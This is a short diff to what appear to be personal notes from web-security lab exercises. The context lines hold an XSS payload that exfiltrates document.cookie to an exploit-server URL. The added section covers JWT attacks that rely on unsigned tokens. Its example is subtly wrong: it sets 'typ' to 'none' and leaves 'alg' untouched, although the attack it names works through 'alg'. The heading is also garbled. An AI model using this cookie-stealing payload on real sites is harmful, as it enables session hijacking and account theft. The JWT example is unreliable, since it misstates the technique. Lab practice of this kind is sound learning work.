@@ -34,3 +34,23 @@ xss ngrpk paylode
 ```js
 <script> var i=new Image(); i.src='https://exploit-0acc00b804bd4cfac0c1a75b017a007d.web-security-academy.net/exploit?='+document.cookie</script>
 ```
+
+---
+JWT attacks Accepting tokens with no signature
+
+```json
+{
+    "alg": "HS256",
+    "typ": "JWT"
+}
+```
+
+to :
+
+```json
+{
+    "alg": "HS256",
+    "typ": "none"
+}
+```
+none or NoNe or noNE ...etc
